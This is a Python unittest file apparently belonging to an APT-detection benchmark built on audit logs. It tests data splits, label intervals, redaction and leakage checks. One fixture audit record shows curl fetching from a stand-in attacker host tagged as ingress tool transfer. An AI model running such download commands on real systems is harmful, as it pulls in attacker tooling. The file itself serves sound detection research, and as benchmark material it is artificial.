import csv
import json
from pathlib import Path
import tempfile
import unittest

from experiments.apt_benchmark.camlds.acquire import digest, select_members
from experiments.apt_benchmark.camlds.events import (
    build_host, family_splits, fragment, interval_labels, load_intervals, verify_source_anchors,
)


class CamLdsTests(unittest.TestCase):
    def test_family_split_matches_frozen_hash_and_keeps_reserves_out(self):
        self.assertEqual(family_splits(), {"3": "fit", "6": "fit", "2": "development", "4": "calibration", "1": "test"})
        self.assertNotIn("5", family_splits())
        self.assertNotIn("7", family_splits())

    def test_interval_boundaries_unknown_and_overlap_union(self):
        intervals = [{"start": 10, "end": 20, "labels": ["T1105"], "step_id": "a"},
                     {"start": 15, "end": 25, "labels": ["T1059", "T1105"], "step_id": "b"}]
        self.assertEqual(interval_labels(9, intervals), ([], []))
        self.assertEqual(interval_labels(10, intervals), (["T1105"], ["a"]))
        self.assertEqual(interval_labels(20, intervals), (["T1059", "T1105"], ["b"]))
        self.assertEqual(interval_labels(17, intervals), (["T1059", "T1105"], ["a", "b"]))
        self.assertEqual(interval_labels(25, intervals), ([], []))

    def test_selection_excludes_attacker_audit_configs_and_alert_labels(self):
        names = ["scenario_4/host/logs/log/audit/audit.log", "scenario_4/host/logs/log/audit/audit.log.1.gz",
                 "scenario_4/attacker/logs/log/audit/audit.log", "scenario_4/host/configs/etc/audit/audit.rules",
                 "scenario_4/host/logs/alerts.json", "scenario_4/attacker/logs/attackmate.json"]
        self.assertEqual([x["name"] for x in select_members([{"name": x} for x in names])], [names[0], names[1], names[-1]])

    def test_semantics_decode_but_do_not_expose_identifiers_or_label_keys(self):
        raw = 'type=EXECVE msg=audit(100.0:1): argc=2 a0="curl" a1="https://video.attackbed.com/T1105" key="T1068_stage"'
        part = fragment(raw, "1_pwnkit_pam", "videoserver", 100)
        self.assertIn("curl", part["text"])
        self.assertNotIn("attackbed", part["text"])
        self.assertNotIn("T1105", part["text"])
        self.assertNotIn("T1068", part["text"])
        self.assertEqual(part["entity_keys"], [])

    def _host(self, root, lines, intervals):
        name = "scenario_4/host/logs/log/audit/audit.log"
        path = root / "raw" / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("\n".join(lines) + "\n", encoding="utf-8")
        member = {"name": name, "sha256": digest(path)}
        return build_host(root, "4", "host", [member], intervals, "calibration")

    def test_fixed_bin_roster_is_selected_before_annotation_lookup(self):
        intervals = [{"start": 106, "end": 125, "labels": ["T1105"], "step_id": "step"}]
        lines = ['type=SYSCALL msg=audit(105.0:1): pid=7 exe="/usr/bin/curl"',
                 'type=SYSCALL msg=audit(106.0:2): pid=7 exe="/usr/bin/curl"',
                 'type=SYSCALL msg=audit(115.0:3): pid=7 exe="/usr/bin/curl"']
        with tempfile.TemporaryDirectory() as folder:
            events, stats = self._host(Path(folder), lines, intervals)
        self.assertEqual([x["query_roster"] for x in events], [True, False, True])
        self.assertEqual([x["target_eligible"] for x in events], [False, False, True])
        self.assertEqual(events[0]["label_status"], "unlabeled_unknown")
        self.assertEqual(stats["positive_targets"]["T1105"], 1)

    def test_event_grouping_and_exact_duplicate_fragment_handling(self):
        intervals = [{"start": 100, "end": 125, "labels": ["T1105"], "step_id": "step"}]
        line = 'type=SYSCALL msg=audit(105.0:1): pid=7 exe="/usr/bin/curl"'
        lines = [line, 'type=EXECVE msg=audit(105.0:1): argc=1 a0="curl"', line]
        with tempfile.TemporaryDirectory() as folder:
            events, stats = self._host(Path(folder), lines, intervals)
        self.assertEqual(len(events), 1)
        self.assertEqual(len(events[0]["fragments"]), 2)
        self.assertEqual(stats["duplicate_fragments"], 1)
        self.assertEqual(events[0]["fragments"][1]["entity_keys"], [])

    def test_future_records_and_changed_future_labels_do_not_change_earlier_features(self):
        intervals = [{"start": 100, "end": 120, "labels": ["T1105"], "step_id": "step"}]
        lines = ['type=SYSCALL msg=audit(105.0:1): pid=7 exe="/usr/bin/curl"']
        with tempfile.TemporaryDirectory() as folder:
            first, _ = self._host(Path(folder), lines, intervals)
            second, _ = self._host(Path(folder), lines + ['type=SYSCALL msg=audit(135.0:2): pid=7 exe="/usr/bin/uname"'],
                                   intervals + [{"start": 130, "end": 140, "labels": ["T1068"], "step_id": "later"}])
        self.assertEqual(first[0], second[0])

    def test_repeated_step_ids_preserve_separate_source_intervals(self):
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            (root / "labels.json").write_text(json.dumps({"4-1": {"metadata": {"T1105": {}}}}))
            with (root / "attack_times.csv").open("w", newline="") as handle:
                writer = csv.DictWriter(handle, fieldnames=["scenario", "event_id", "techniques", "start", "end"], delimiter=";")
                writer.writeheader()
                for start in (100, 200):
                    writer.writerow({"scenario": "4", "event_id": "1", "techniques": "T1105", "start": start, "end": start + 10})
            values = load_intervals(root)["4"]
        self.assertEqual([x["step_id"] for x in values], ["4-1:occurrence1", "4-1:occurrence2"])

    def test_source_anchors_reject_labels_not_in_original_chronology(self):
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            name = "scenario_4/attacker/logs/attackmate.json"
            path = root / "raw" / name
            path.parent.mkdir(parents=True)
            source = {"start-datetime": "2026-01-01T00:00:00", "type": "shell", "cmd": "curl"}
            path.write_text(json.dumps(source) + "\n")
            members = [{"name": name, "sha256": digest(path)}]
            labels = {"4-1": {"scenario_variant": "4", "attackmate": dict(source)}}
            self.assertEqual(verify_source_anchors(root, "4", members, labels)["verified_label_anchors"], 1)
            labels["4-1"]["attackmate"]["cmd"] = "invented"
            with self.assertRaisesRegex(ValueError, "anchor absent"):
                verify_source_anchors(root, "4", members, labels)


if __name__ == "__main__":
    unittest.main()
